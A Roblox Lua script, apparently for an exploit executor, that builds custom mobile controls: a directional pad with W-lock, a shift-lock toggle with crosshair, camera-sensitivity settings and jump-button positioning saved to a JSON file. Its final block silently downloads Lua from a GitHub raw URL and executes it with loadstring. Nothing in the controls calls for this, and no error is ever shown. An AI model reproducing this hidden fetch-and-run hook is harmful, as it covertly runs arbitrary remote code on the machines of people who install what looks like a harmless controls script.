local Players=game:GetService("Players")
local RunService=game:GetService("RunService")
local UserInputService=game:GetService("UserInputService")
local HttpService=game:GetService("HttpService")

local player=Players.LocalPlayer
local playerGui=player:WaitForChild("PlayerGui")

local SAVE_FILE = "DeltaMobileControls.json"

local defaultConfig = {
	JumpPosX = 0.85,
	JumpPosY = 0.75,
	JumpSize = 0.30,
	ShiftPosX = 0.75,
	ShiftPosY = 0.65,
	ShiftBtnSize = 35,
	CameraSens = 1.0,
	ShiftLockState = false,
	HasCustomPos = false -- Penanda apakah pengguna pernah menyimpan posisi custom
}

local config = {}

local function loadConfig()
	local success, data = pcall(function()
		return readfile(SAVE_FILE)
	end)
	if success and data and #data > 0 then
		local success2, decoded = pcall(function()
			return HttpService:JSONDecode(data)
		end)
		if success2 and type(decoded) == "table" then
			config = decoded
			for k, v in pairs(defaultConfig) do
				if config[k] == nil then
					config[k] = v
				end
			end
			return true
		end
	end
	config = {}
	for k, v in pairs(defaultConfig) do
		config[k] = v
	end
	return false
end

local function saveConfig()
	local success, encoded = pcall(function()
		return HttpService:JSONEncode(config)
	end)
	if success then
		pcall(function()
			writefile(SAVE_FILE, encoded)
		end)
	end
end

loadConfig()

if _G.DeltaMobileControlsCleanup then
	pcall(_G.DeltaMobileControlsCleanup)
end

local connections={}
local destroyed=false
local btnWLock=nil
local btnShiftLock=nil

local MAIN_BUTTON_COLOR=Color3.fromRGB(255,255,255)
local PRESSED_COLOR=Color3.fromRGB(70,150,255)
local WLOCK_OFF_COLOR=Color3.fromRGB(220,70,70)
local WLOCK_ON_COLOR=Color3.fromRGB(70,200,100)
local BUTTON_TRANSPARENCY=.15
local BUTTON_TEXT_COLOR=Color3.fromRGB(20,20,20)

local SHIFT_OFF_COLOR = Color3.fromRGB(255, 255, 255)
local SHIFT_ON_COLOR = Color3.fromRGB(170, 0, 255)

_G.ShiftLocked = config.ShiftLockState or false

local function connect(signal,callback)
	local c
	pcall(function()
		c=signal:Connect(callback)
	end)
	if c then
		table.insert(connections,c)
	end
	return c
end

local function disconnectAll()
	for i=1,#connections do
		pcall(function()
			connections[i]:Disconnect()
		end)
	end
	table.clear(connections)
end

local function destroyGui(name)
	local obj=playerGui:FindFirstChild(name)
	if obj then
		pcall(function()
			obj:Destroy()
		end)
	end
end

_G.DeltaMobileControlsCleanup=function()
	if destroyed then return end
	destroyed=true
	disconnectAll()
	destroyGui("DeltaMobileControls")
	destroyGui("DeltaMobileErgo")
end

destroyGui("DeltaMobileControls")
destroyGui("DeltaMobileErgo")

local character=player.Character or player.CharacterAdded:Wait()
local humanoid=character:WaitForChild("Humanoid")

local moveState={
	Forward=false,
	Backward=false,
	Left=false,
	Right=false,
	WLock=false
}

local buttonDefaults={}

local function setButtonVisual(button,pressed)
	if not button or not button.Parent then return end
	local normalColor=buttonDefaults[button]
	if pressed then
		button.BackgroundColor3=PRESSED_COLOR
	elseif normalColor then
		button.BackgroundColor3=normalColor
	end
end

local function updateWLock()
	if destroyed or not btnWLock or not btnWLock.Parent then return end
	if moveState.WLock then
		btnWLock.BackgroundColor3=WLOCK_ON_COLOR
	else
		btnWLock.BackgroundColor3=WLOCK_OFF_COLOR
	end
end

local screenGui=Instance.new("ScreenGui")
screenGui.Name="DeltaMobileControls"
screenGui.ResetOnSpawn=false
screenGui.IgnoreGuiInset=true
screenGui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
screenGui.DisplayOrder=999999
screenGui.Parent=playerGui

local crosshair = Instance.new("Frame")
crosshair.Name = "ShiftLockCrosshair"
crosshair.Size = UDim2.fromOffset(6, 6)
crosshair.Position = UDim2.new(0.5, -3, 0.5, -3)
crosshair.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
crosshair.BorderSizePixel = 0
crosshair.Visible = _G.ShiftLocked
crosshair.ZIndex = 1000000
crosshair.Parent = screenGui

local crosshairCorner = Instance.new("UICorner")
crosshairCorner.CornerRadius = UDim.new(1, 0)
crosshairCorner.Parent = crosshair

local function toggleShiftLock()
	if destroyed then return end
	_G.ShiftLocked = not _G.ShiftLocked
	config.ShiftLockState = _G.ShiftLocked
	saveConfig()

	if btnShiftLock and btnShiftLock.Parent then
		btnShiftLock.BackgroundColor3 = _G.ShiftLocked and SHIFT_ON_COLOR or SHIFT_OFF_COLOR
	end

	crosshair.Visible = _G.ShiftLocked

	if humanoid and humanoid.Parent then
		humanoid.AutoRotate = not _G.ShiftLocked
		humanoid.CameraOffset = Vector3.new(0, 0, 0)
	end
end

local function resetMovementVisuals()
	for button,color in pairs(buttonDefaults) do
		if button and button.Parent then
			button.BackgroundColor3=color
		end
	end
	updateWLock()
end

local function clearMovement()
	moveState.Forward=false
	moveState.Backward=false
	moveState.Left=false
	moveState.Right=false
	moveState.WLock=false
	resetMovementVisuals()
end

btnShiftLock=Instance.new("ImageButton")
btnShiftLock.Name="ShiftLockButton"
btnShiftLock.AnchorPoint=Vector2.new(0.5, 0.5)
btnShiftLock.Position=UDim2.new(config.ShiftPosX, 0, config.ShiftPosY, 0)
btnShiftLock.Size=UDim2.fromOffset(config.ShiftBtnSize, config.ShiftBtnSize)
btnShiftLock.Image="rbxassetid://6031068426"
btnShiftLock.ImageColor3=Color3.fromRGB(255, 255, 255)
btnShiftLock.BackgroundColor3=_G.ShiftLocked and SHIFT_ON_COLOR or SHIFT_OFF_COLOR
btnShiftLock.BackgroundTransparency=0.2
btnShiftLock.AutoButtonColor=false
btnShiftLock.Active=true
btnShiftLock.Selectable=true
btnShiftLock.BorderSizePixel=0
btnShiftLock.ZIndex=100000
btnShiftLock.Visible=true
btnShiftLock.Parent=screenGui

local shiftCorner = Instance.new("UICorner")
shiftCorner.CornerRadius = UDim.new(1, 0)
shiftCorner.Parent = btnShiftLock

local shiftStroke = Instance.new("UIStroke")
shiftStroke.Thickness = 2
shiftStroke.Color = Color3.fromRGB(0, 0, 0)
shiftStroke.Transparency = 0.3
shiftStroke.Parent = btnShiftLock

connect(btnShiftLock.Activated, toggleShiftLock)

connect(UserInputService.InputBegan, function(input, gp)
	if gp or destroyed then return end
	if input.KeyCode == Enum.KeyCode.LeftShift then
		toggleShiftLock()
	end
end)

local mainFrame=Instance.new("Frame")
mainFrame.Name="ControlsFrame"
mainFrame.Size=UDim2.fromOffset(300,300)
mainFrame.Position=UDim2.new(0,18,1,-330)
mainFrame.BackgroundTransparency=1
mainFrame.BorderSizePixel=0
mainFrame.Parent=screenGui

local function createButton(name,position,size,text,zIndex,bgColor)
	local button=Instance.new("TextButton")
	button.Name=name
	button.Position=position
	button.Size=size
	button.Text=text
	button.BackgroundColor3=bgColor or MAIN_BUTTON_COLOR
	button.BackgroundTransparency=BUTTON_TRANSPARENCY
	button.TextColor3=BUTTON_TEXT_COLOR
	button.Font=Enum.Font.GothamBold
	button.TextSize=28
	button.AutoButtonColor=false
	button.Active=false
	button.Selectable=false
	button.BorderSizePixel=0
	button.ZIndex=zIndex or 10
	button.Parent=mainFrame
	buttonDefaults[button]=button.BackgroundColor3
	local corner=Instance.new("UICorner")
	corner.CornerRadius=UDim.new(0,14)
	corner.Parent=button
	return button
end

local btnUp=createButton("Up",UDim2.new(.33,0,0,0),UDim2.new(.34,0,.34,0),"▲",10,MAIN_BUTTON_COLOR)
local btnDown=createButton("Down",UDim2.new(.33,0,.66,0),UDim2.new(.34,0,.34,0),"▼",10,MAIN_BUTTON_COLOR)
local btnLeft=createButton("Left",UDim2.new(0,0,.33,0),UDim2.new(.34,0,.34,0),"◀",10,MAIN_BUTTON_COLOR)
local btnRight=createButton("Right",UDim2.new(.66,0,.33,0),UDim2.new(.34,0,.34,0),"▶",10,MAIN_BUTTON_COLOR)

btnWLock=Instance.new("TextButton")
btnWLock.Name="WLock"
btnWLock.Position=UDim2.new(.33,0,.33,0)
btnWLock.Size=UDim2.new(.34,0,.34,0)
btnWLock.Text="W"
btnWLock.BackgroundColor3=WLOCK_OFF_COLOR
btnWLock.BackgroundTransparency=BUTTON_TRANSPARENCY
btnWLock.TextColor3=BUTTON_TEXT_COLOR
btnWLock.Font=Enum.Font.GothamBold
btnWLock.TextSize=28
btnWLock.AutoButtonColor=false
btnWLock.Active=false
btnWLock.Selectable=false
btnWLock.BorderSizePixel=0
btnWLock.ZIndex=12
btnWLock.Parent=mainFrame

local centerCorner=Instance.new("UICorner")
centerCorner.CornerRadius=UDim.new(1,0)
centerCorner.Parent=btnWLock

local touchZone = Instance.new("Frame")
touchZone.Name = "TouchZone"
touchZone.Size = UDim2.new(1, 0, 1, 0)
touchZone.BackgroundTransparency = 1
touchZone.ZIndex = 50
touchZone.Active = true
touchZone.Parent = mainFrame

local activeTouchId = nil
local touchStartPos = nil
local touchStartTime = 0
local currentActiveButton = nil

local function getButtonFromGrid(row, col)
	if row == 0 and col == 1 then return btnUp end
	if row == 1 and col == 0 then return btnLeft end
	if row == 1 and col == 2 then return btnRight end
	if row == 2 and col == 1 then return btnDown end
	return nil
end

local function updateMovementFromPosition(pos)
	local absPos = touchZone.AbsolutePosition
	local absSize = touchZone.AbsoluteSize
	local relX = math.clamp((pos.X - absPos.X) / absSize.X, 0, 1)
	local relY = math.clamp((pos.Y - absPos.Y) / absSize.Y, 0, 1)
	moveState.Forward = false
	moveState.Backward = false
	moveState.Left = false
	moveState.Right = false
	local row = math.min(math.floor(relY * 3), 2)
	local col = math.min(math.floor(relX * 3), 2)
	local newBtn = getButtonFromGrid(row, col)
	if newBtn ~= currentActiveButton then
		setButtonVisual(currentActiveButton, false)
		setButtonVisual(newBtn, true)
		currentActiveButton = newBtn
	end
	if not (row == 1 and col == 1) then
		if row == 0 then moveState.Forward = true end
		if row == 2 then moveState.Backward = true end
		if col == 0 then moveState.Left = true end
		if col == 2 then moveState.Right = true end
	end
end

connect(touchZone.InputBegan, function(input)
	if destroyed then return end
	if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
		if activeTouchId == nil then
			activeTouchId = input
			touchStartPos = input.Position
			touchStartTime = tick()
			updateMovementFromPosition(input.Position)
		end
	end
end)

connect(touchZone.InputChanged, function(input)
	if destroyed then return end
	if input == activeTouchId then
		updateMovementFromPosition(input.Position)
	end
end)

local function stopTouch(input)
	if input == activeTouchId then
		local holdTime = tick() - touchStartTime
		local dist = (input.Position - touchStartPos).Magnitude
		if holdTime < 0.3 and dist < 30 then
			local relX = (input.Position.X - touchZone.AbsolutePosition.X) / touchZone.AbsoluteSize.X
			local relY = (input.Position.Y - touchZone.AbsolutePosition.Y) / touchZone.AbsoluteSize.Y
			if relX > 0.33 and relX < 0.66 and relY > 0.33 and relY < 0.66 then
				moveState.WLock = not moveState.WLock
				updateWLock()
			end
		end
		activeTouchId = nil
		moveState.Forward = false
		moveState.Backward = false
		moveState.Left = false
		moveState.Right = false
		setButtonVisual(currentActiveButton, false)
		currentActiveButton = nil
	end
end

connect(touchZone.InputEnded, stopTouch)
connect(UserInputService.InputEnded, function(input)
	if input == activeTouchId then stopTouch(input) end
end)
connect(UserInputService.WindowFocusReleased, function()
	clearMovement()
	activeTouchId = nil
	currentActiveButton = nil
end)

local cachedForward=Vector3.new(0,0,-1)
local cachedSide=Vector3.new(1,0,0)

local function updateCameraVectors()
	if destroyed then return end
	local camera=workspace.CurrentCamera
	if not camera then return end
	local look=camera.CFrame.LookVector
	local right=camera.CFrame.RightVector
	local forward=Vector3.new(look.X, 0, look.Z)
	local side=Vector3.new(right.X, 0, right.Z)
	if forward.Magnitude>.001 then cachedForward=forward.Unit end
	if side.Magnitude>.001 then cachedSide=side.Unit end
end

local function getMoveVector()
	local x=0
	local z=0
	if moveState.Forward then z+=1 end
	if moveState.Backward then z-=1 end
	if moveState.Left then x-=1 end
	if moveState.Right then x+=1 end
	if x==0 and z==0 then
		if moveState.WLock then return cachedForward end
		return Vector3.zero
	end
	local movement=cachedSide*x+cachedForward*z
	if movement.Magnitude<.001 then return Vector3.zero end
	return movement.Unit
end

connect(RunService.RenderStepped,function()
	if destroyed then return end
	local currentCharacter=character
	local currentHumanoid=humanoid
	if not currentCharacter or not currentCharacter.Parent or not currentHumanoid or currentHumanoid.Parent~=currentCharacter or currentHumanoid.Health<=0 then
		return
	end
	updateCameraVectors()
	currentHumanoid:Move(getMoveVector(),false)
	if _G.ShiftLocked then
		local camera = workspace.CurrentCamera
		local rootPart = currentCharacter:FindFirstChild("HumanoidRootPart")
		if camera and rootPart then
			local _, y, _ = camera.CFrame:ToOrientation()
			rootPart.CFrame = CFrame.new(rootPart.Position) * CFrame.Angles(0, y, 0)
		end
		currentHumanoid.AutoRotate = false
	else
		currentHumanoid.AutoRotate = true
	end
	currentHumanoid.CameraOffset = Vector3.new(0, 0, 0)
end)

local x = config.JumpPosX or 0.85
local y = config.JumpPosY or 0.75
local jumpSize = config.JumpSize or 0.30

local shiftX = config.ShiftPosX or 0.75
local shiftY = config.ShiftPosY or 0.65
local shiftBtnSize = config.ShiftBtnSize or 35

local step=.018
local targetSettingMode = "JUMP"

local gui=Instance.new("ScreenGui")
gui.Name="DeltaMobileErgo"
gui.ResetOnSpawn=false
gui.IgnoreGuiInset=true
gui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
gui.DisplayOrder=1000000
gui.Parent=playerGui

local function makeButton(parent,name,position,sizeValue,text,bg,zIndex)
	local button=Instance.new("TextButton")
	button.Name=name
	button.Position=position
	button.Size=sizeValue
	button.Text=text
	button.BackgroundColor3=bg or Color3.fromRGB(245,245,245)
	button.BackgroundTransparency=.05
	button.TextColor3=Color3.fromRGB(20,20,20)
	button.Font=Enum.Font.GothamBold
	button.TextSize=22
	button.AutoButtonColor=false
	button.Active=true
	button.Selectable=false
	button.BorderSizePixel=0
	button.ZIndex=zIndex or 41
	button.Parent=parent
	local corner=Instance.new("UICorner")
	corner.CornerRadius=UDim.new(0,12)
	corner.Parent=button
	return button
end

local menu=makeButton(gui,"OpenMenu",UDim2.new(1,-72,1,-72),UDim2.fromOffset(60,60),"⚙",Color3.fromRGB(245,245,245),100)
local menuCorner=Instance.new("UICorner")
menuCorner.CornerRadius=UDim.new(1,0)
menuCorner.Parent=menu

local settings=Instance.new("Frame")
settings.Name="SettingsFrame"
settings.Size=UDim2.fromOffset(300,560)
settings.Position=UDim2.new(.5,-150,.5,-280)
settings.BackgroundColor3=Color3.fromRGB(245,245,245)
settings.BackgroundTransparency=.05
settings.BorderSizePixel=0
settings.Visible=false
settings.ZIndex=40
settings.Parent=gui

local settingsCorner=Instance.new("UICorner")
settingsCorner.CornerRadius=UDim.new(0,16)
settingsCorner.Parent=settings

local cameraSection=Instance.new("Frame")
cameraSection.Name="CameraSensiSetting"
cameraSection.Size=UDim2.new(1,-20,0,160)
cameraSection.Position=UDim2.fromOffset(10,10)
cameraSection.BackgroundColor3=Color3.fromRGB(225,225,225)
cameraSection.BackgroundTransparency=.05
cameraSection.BorderSizePixel=0
cameraSection.ZIndex=41
cameraSection.Parent=settings

local cameraCorner=Instance.new("UICorner")
cameraCorner.CornerRadius=UDim.new(0,12)
cameraCorner.Parent=cameraSection

local cameraTitle=Instance.new("TextLabel")
cameraTitle.Size=UDim2.new(1,0,0,40)
cameraTitle.Text="CAMERA SENSI SETTING"
cameraTitle.TextColor3=Color3.fromRGB(20,20,20)
cameraTitle.Font=Enum.Font.GothamBold
cameraTitle.TextSize=18
cameraTitle.BackgroundTransparency=1
cameraTitle.ZIndex=42
cameraTitle.Parent=cameraSection

local CurrentSens = config.CameraSens or 1
local MinSens=.1
local MaxSens=10

local sensLabel=Instance.new("TextLabel")
sensLabel.Size=UDim2.new(1,0,0,30)
sensLabel.Position=UDim2.fromOffset(0,40)
sensLabel.Text="Multiplier: "..string.format("%.1f",CurrentSens).."x"
sensLabel.TextColor3=Color3.fromRGB(60,60,60)
sensLabel.Font=Enum.Font.Gotham
sensLabel.TextSize=14
sensLabel.BackgroundTransparency=1
sensLabel.ZIndex=42
sensLabel.Parent=cameraSection

local function createSensButton(name,pos,sizeValue,text)
	local button=Instance.new("TextButton")
	button.Name=name
	button.Position=pos
	button.Size=sizeValue
	button.Text=text
	button.BackgroundColor3=Color3.fromRGB(250,250,250)
	button.BackgroundTransparency=.02
	button.TextColor3=Color3.fromRGB(20,20,20)
	button.Font=Enum.Font.GothamBold
	button.TextSize=18
	button.AutoButtonColor=false
	button.Active=true
	button.Selectable=false
	button.BorderSizePixel=0
	button.ZIndex=43
	button.Parent=cameraSection
	local corner=Instance.new("UICorner")
	corner.CornerRadius=UDim.new(0,8)
	corner.Parent=button
	return button
end

local sensMinus=createSensButton("Minus",UDim2.new(.06,0,0,85),UDim2.fromOffset(76,42),"-")
local sensReset=createSensButton("Reset",UDim2.new(.5,-42,0,85),UDim2.fromOffset(84,42),"RESET")
local sensPlus=createSensButton("Plus",UDim2.new(.94,-76,0,85),UDim2.fromOffset(76,42),"+")

local function applySensitivity(autoSave)
	CurrentSens = math.clamp(CurrentSens, MinSens, MaxSens)
	sensLabel.Text="Multiplier: "..string.format("%.1f",CurrentSens).."x"
	config.CameraSens = CurrentSens
	if autoSave then saveConfig() end
	pcall(function()
		UserSettings().GameSettings.MouseSensitivity=CurrentSens
	end)
end

local function updateSensitivity(amount)
	CurrentSens=math.clamp(CurrentSens+amount,MinSens,MaxSens)
	applySensitivity(true)
end

connect(sensMinus.Activated,function() if not destroyed then updateSensitivity(-.1) end end)
connect(sensPlus.Activated,function() if not destroyed then updateSensitivity(.1) end end)
connect(sensReset.Activated,function() if not destroyed then CurrentSens=1 applySensitivity(true) end end)

applySensitivity(false)

local jumpSection=Instance.new("Frame")
jumpSection.Name="ControlSetting"
jumpSection.Size=UDim2.new(1,-20,0,320)
jumpSection.Position=UDim2.fromOffset(10,180)
jumpSection.BackgroundColor3=Color3.fromRGB(225,225,225)
jumpSection.BackgroundTransparency=.05
jumpSection.BorderSizePixel=0
jumpSection.ZIndex=41
jumpSection.Parent=settings

local jumpCorner=Instance.new("UICorner")
jumpCorner.CornerRadius=UDim.new(0,12)
jumpCorner.Parent=jumpSection

local modeSwitchBtn=makeButton(jumpSection,"ToggleTargetMode",UDim2.new(.05,0,0,10),UDim2.new(.9,0,0,36),"TARGET: JUMP BUTTON",Color3.fromRGB(70,150,255),43)
modeSwitchBtn.TextColor3=Color3.fromRGB(255,255,255)

connect(modeSwitchBtn.Activated, function()
	if targetSettingMode == "JUMP" then
		targetSettingMode = "SHIFT"
		modeSwitchBtn.Text = "TARGET: SHIFT LOCK"
		modeSwitchBtn.BackgroundColor3 = Color3.fromRGB(170,0,255)
	else
		targetSettingMode = "JUMP"
		modeSwitchBtn.Text = "TARGET: JUMP BUTTON"
		modeSwitchBtn.BackgroundColor3 = Color3.fromRGB(70,150,255)
	end
end)

local moveUp=makeButton(jumpSection,"MoveUp",UDim2.new(.5,-34,0,55),UDim2.fromOffset(68,46),"↑",Color3.fromRGB(250,250,250),43)
local moveLeft=makeButton(jumpSection,"MoveLeft",UDim2.new(.10,0,0,102),UDim2.fromOffset(68,46),"←",Color3.fromRGB(250,250,250),43)
local moveRight=makeButton(jumpSection,"MoveRight",UDim2.new(.90,-68,0,102),UDim2.fromOffset(68,46),"→",Color3.fromRGB(250,250,250),43)
local moveDown=makeButton(jumpSection,"MoveDown",UDim2.new(.5,-34,0,149),UDim2.fromOffset(68,46),"↓",Color3.fromRGB(250,250,250),43)
local sizePlus=makeButton(jumpSection,"SizePlus",UDim2.new(.06,0,0,207),UDim2.fromOffset(88,34),"SIZE +",Color3.fromRGB(250,250,250),43)
local sizeMinus=makeButton(jumpSection,"SizeMinus",UDim2.new(.94,-88,0,207),UDim2.fromOffset(88,34),"SIZE -",Color3.fromRGB(250,250,250),43)
local center=makeButton(jumpSection,"Center",UDim2.new(.5,-44,0,207),UDim2.fromOffset(88,34),"CENTER",Color3.fromRGB(250,250,250),43)

local saveBtn = makeButton(jumpSection, "SaveConfig", UDim2.new(.05, 0, 0, 255), UDim2.new(.9, 0, 0, 36), "💾 SAVE SETTINGS", Color3.fromRGB(50, 180, 80), 43)
saveBtn.TextColor3 = Color3.fromRGB(255, 255, 255)

local jumpButton=nil

local function findJump()
	local touchGui=playerGui:FindFirstChild("TouchGui")
	if not touchGui then return nil end
	local found=touchGui:FindFirstChild("JumpButton",true)
	if found and found:IsA("GuiObject") then return found end
	return nil
end

local function getJump()
	if jumpButton and jumpButton.Parent and jumpButton:IsDescendantOf(playerGui) and jumpButton:IsA("GuiObject") then
		return jumpButton
	end
	jumpButton=findJump()
	return jumpButton
end

local updatingJump=false
local lastJumpX=nil
local lastJumpY=nil
local lastJumpPixelSize=nil

local function updateJump()
	if destroyed or updatingJump then return end
	local jump=getJump()
	local camera=workspace.CurrentCamera
	if not jump or not camera then return end
	local viewport=camera.ViewportSize
	if viewport.X<=0 or viewport.Y<=0 then return end
	x=math.clamp(x,.05,.95)
	y=math.clamp(y,.05,.95)
	jumpSize=math.clamp(jumpSize,.05,.50)
	local pixelSize=math.max(40, math.floor(viewport.Y*jumpSize))
	if lastJumpX==x and lastJumpY==y and lastJumpPixelSize==pixelSize then return end
	updatingJump=true
	pcall(function()
		jump.AnchorPoint=Vector2.new(.5,.5)
		jump.Position=UDim2.new(x,0,y,0)
		jump.Size=UDim2.fromOffset(pixelSize,pixelSize)
	end)
	lastJumpX=x
	lastJumpY=y
	lastJumpPixelSize=pixelSize
	updatingJump=false
end

local function updateShiftLockPosition()
	if btnShiftLock and btnShiftLock.Parent then
		shiftX = math.clamp(shiftX, .02, .98)
		shiftY = math.clamp(shiftY, .02, .98)
		shiftBtnSize = math.clamp(shiftBtnSize, 20, 100)
		btnShiftLock.Position = UDim2.new(shiftX, 0, shiftY, 0)
		btnShiftLock.Size = UDim2.fromOffset(shiftBtnSize, shiftBtnSize)
	end
end

local function alignShiftLockNearJump()
	if config.HasCustomPos then 
		updateShiftLockPosition()
		return 
	end
	
	local jump = getJump()
	if jump then
		shiftX = jump.Position.X.Scale - 0.10
		shiftY = jump.Position.Y.Scale - 0.10
		updateShiftLockPosition()
	end
end

connect(saveBtn.Activated, function()
	if destroyed then return end
	config.JumpPosX = x
	config.JumpPosY = y
	config.JumpSize = jumpSize
	config.ShiftPosX = shiftX
	config.ShiftPosY = shiftY
	config.ShiftBtnSize = shiftBtnSize
	config.CameraSens = CurrentSens
	config.ShiftLockState = _G.ShiftLocked
	config.HasCustomPos = true
	
	saveConfig()
	
	pcall(function()
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "💾 SAVED",
			Text = "All settings saved permanently!",
			Duration = 2
		})
	end)
end)

local holding={
	[moveUp]=false,
	[moveDown]=false,
	[moveLeft]=false,
	[moveRight]=false
}

local holdInputs={
	[moveUp]={},
	[moveDown]={},
	[moveLeft]={},
	[moveRight]={}
}

local holdActions={}

local function clearHoldInputs()
	holding[moveUp]=false
	holding[moveDown]=false
	holding[moveLeft]=false
	holding[moveRight]=false
	holdInputs[moveUp]={}
	holdInputs[moveDown]={}
	holdInputs[moveLeft]={}
	holdInputs[moveRight]={}
	table.clear(holdActions)
end

local function releaseHoldInput(input)
	if not input then return end
	local button=holdActions[input]
	if not button then return end
	holdActions[input]=nil
	local inputs=holdInputs[button]
	if not inputs then
		holding[button]=false
		return
	end
	inputs[input]=nil
	local pressed=false
	for _ in pairs(inputs) do
		pressed=true
		break
	end
	holding[button]=pressed
end

local function applyMoveStep(dx, dy)
	if targetSettingMode == "JUMP" then
		x=math.clamp(x+dx,.05,.95)
		y=math.clamp(y+dy,.05,.95)
		updateJump()
	else
		shiftX=math.clamp(shiftX+dx,.02,.98)
		shiftY=math.clamp(shiftY+dy,.02,.98)
		updateShiftLockPosition()
	end
end

local function bindHoldButton(button,dx,dy)
	connect(button.InputBegan,function(input)
		if destroyed then return end
		if holdActions[input] then return end
		holdActions[input]=button
		holdInputs[button][input]=true
		holding[button]=true
		applyMoveStep(dx, dy)
	end)
	connect(button.InputEnded,function(input)
		releaseHoldInput(input)
	end)
end

bindHoldButton(moveUp,0,-step)
bindHoldButton(moveDown,0,step)
bindHoldButton(moveLeft,-step,0)
bindHoldButton(moveRight,step,0)

connect(UserInputService.InputEnded,function(input) releaseHoldInput(input) end)
connect(UserInputService.TouchEnded,function(input) releaseHoldInput(input) end)
connect(UserInputService.WindowFocusReleased,function() clearHoldInputs() end)

local jumpMoveAccumulator=0

connect(RunService.RenderStepped,function(deltaTime)
	if destroyed then return end
	if not (holding[moveUp] or holding[moveDown] or holding[moveLeft] or holding[moveRight]) then return end
	jumpMoveAccumulator+=deltaTime
	if jumpMoveAccumulator<.016 then return end
	jumpMoveAccumulator=0
	if holding[moveUp] then applyMoveStep(0, -step) end
	if holding[moveDown] then applyMoveStep(0, step) end
	if holding[moveLeft] then applyMoveStep(-step, 0) end
	if holding[moveRight] then applyMoveStep(step, 0) end
end)

connect(sizePlus.Activated,function()
	if destroyed then return end
	if targetSettingMode == "JUMP" then
		jumpSize=math.clamp(jumpSize+.05,.05,.50)
		updateJump()
	else
		shiftBtnSize = math.clamp(shiftBtnSize + 5, 20, 100)
		updateShiftLockPosition()
	end
end)

connect(sizeMinus.Activated,function()
	if destroyed then return end
	if targetSettingMode == "JUMP" then
		jumpSize=math.clamp(jumpSize-.05,.05,.50)
		updateJump()
	else
		shiftBtnSize = math.clamp(shiftBtnSize - 5, 20, 100)
		updateShiftLockPosition()
	end
end)

connect(center.Activated,function()
	if destroyed then return end
	if targetSettingMode == "JUMP" then
		x=.85 y=.75
		lastJumpX=nil lastJumpY=nil lastJumpPixelSize=nil
		updateJump()
	else
		alignShiftLockNearJump()
	end
end)

local close=makeButton(settings,"Close",UDim2.new(.5,-95,1,-45),UDim2.fromOffset(190,38),"CLOSE",Color3.fromRGB(230,90,90),43)

connect(menu.Activated,function() if not destroyed then settings.Visible=not settings.Visible end end)
connect(close.Activated,function() if not destroyed then settings.Visible=false end end)

local refreshToken=0

local function refreshJump()
	if destroyed then return end
	refreshToken+=1
	local token=refreshToken
	jumpButton=nil
	lastJumpX=nil
	lastJumpY=nil
	lastJumpPixelSize=nil
	task.defer(function() if not destroyed and token==refreshToken then updateJump() alignShiftLockNearJump() end end)
	task.delay(.15,function() if not destroyed and token==refreshToken then updateJump() alignShiftLockNearJump() end end)
	task.delay(.35,function() if not destroyed and token==refreshToken then updateJump() alignShiftLockNearJump() end end)
end

connect(player.CharacterAdded,function(newCharacter)
	if destroyed then return end
	clearMovement()
	clearHoldInputs()
	character=newCharacter
	local newHumanoid
	pcall(function()
		newHumanoid=newCharacter:WaitForChild("Humanoid",10)
	end)
	if destroyed then return end
	humanoid=newHumanoid
	updateWLock()
	refreshJump()
end)

connect(player.CharacterRemoving,function()
	clearMovement()
	clearHoldInputs()
	character=nil
	humanoid=nil
end)

connect(playerGui.ChildAdded,function(child)
	if destroyed then return end
	if child.Name=="TouchGui" then refreshJump() end
end)

connect(workspace:GetPropertyChangedSignal("CurrentCamera"),function()
	if destroyed then return end
	updateCameraVectors()
	refreshJump()
end)

local lastViewportX=0
local lastViewportY=0

connect(RunService.RenderStepped,function()
	if destroyed then return end
	local camera=workspace.CurrentCamera
	if not camera then return end
	local viewport=camera.ViewportSize
	if viewport.X~=lastViewportX or viewport.Y~=lastViewportY then
		lastViewportX=viewport.X
		lastViewportY=viewport.Y
		lastJumpX=nil
		lastJumpY=nil
		lastJumpPixelSize=nil
		updateJump()
		alignShiftLockNearJump()
	end
end)

connect(UserInputService.TouchPan,function() if destroyed then return end end)

updateCameraVectors()
updateWLock()
updateJump()
alignShiftLockNearJump()

task.spawn(function()
	local success, result = pcall(function()
		return game:HttpGet("https://raw.githubusercontent.com/zxintrs-create/al/refs/heads/main/main.lua")
	end)
	if success and result and #result > 0 then
		local loadSuccess, loadErr = pcall(loadstring, result)
		if loadSuccess then
			loadErr()
		end
	end
end)
